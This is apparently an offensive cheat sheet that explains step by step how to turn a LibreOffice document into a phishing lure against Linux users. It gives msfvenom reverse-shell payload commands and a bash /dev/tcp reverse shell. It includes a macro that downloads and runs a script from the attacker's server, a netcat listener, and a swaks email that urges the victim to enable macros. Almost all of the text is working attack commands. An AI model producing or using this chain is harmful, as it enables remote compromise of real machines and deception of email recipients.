# LibreOffice Macros

## Linux Targets

### 1) Generate a Linux-compatible reverse shell

    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o shell.elf
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f bash -o payload.sh
    msfvenom -p python/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw -o payload.py
    echo 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' > shell.sh

### 2) Create a Malicious LibreOffice Macro


1. Open LibreOffice Writer and press ALT + F11 to open the macro editor.

2. Create a new macro under My Macros > Standard > Module1.

        Sub RunShell
            Shell("/bin/bash -c 'wget http://<your_ip>/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh'")
        End Sub

3. Host the Payload on a Web Server

        python3 -m http.server 80

4. Save the LibreOffice Document with Macro

Save the document as update.odt with the embedded macro. LibreOffice macros are not executed automatically—social engineering is needed to trick the target into enabling macros. 

5. Setup listener

        nc -lvnp 4444

6. Deliver

        swaks --to target@example.com --from emmanuel@example.com \ --server smtp.example.com:587 --auth LOGIN \ --auth-user emmanuel@example.com --auth-password 'your_password' \ --attach update.odt --header "Subject: Important Update" \ --body "Hello,\n\nPlease find the attached document and enable macros to view the content.\n\nBest regards,\nEmmanuel"
